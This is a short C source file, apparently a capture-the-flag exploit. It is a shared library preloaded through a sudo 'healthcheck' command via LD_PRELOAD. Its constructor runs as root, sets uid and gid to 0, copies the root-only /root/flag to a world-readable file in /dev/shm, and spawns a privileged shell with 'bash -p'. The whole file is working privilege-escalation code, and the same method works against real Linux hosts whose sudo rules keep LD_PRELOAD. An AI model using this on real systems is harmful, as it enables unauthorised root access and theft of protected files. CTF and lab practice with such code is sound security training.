/* Preloaded via `sudo LD_PRELOAD=... healthcheck`. Its constructor runs as root
 * (before main), copies the root-only flag somewhere ctf can read, and drops a
 * root shell. */
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void pwn(void) {
    setuid(0); setgid(0);
    system("cp /root/flag /dev/shm/loot 2>/dev/null; chmod 644 /dev/shm/loot 2>/dev/null");
    system("/bin/bash -p 2>/dev/null || /bin/sh -p");
}
